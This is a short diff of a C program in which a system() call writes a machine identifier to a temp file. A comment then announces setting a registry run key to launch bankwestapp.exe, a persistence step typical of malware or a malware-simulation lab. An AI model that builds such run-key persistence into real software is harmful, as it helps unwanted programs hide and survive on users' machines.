@@ -37,7 +37,7 @@ int main()
     CloseHandle(hfile);
 
 //Create computer.txt content
-	system("echo 192.168.255.18 > c:\\Users\\saurav\\Temp\\computer.txt");
+	system("echo SauravWindowsVi > c:\\Users\\saurav\\Temp\\computer.txt");
     
 //Set registry runkey Value - point to bankwestapp.exe
 
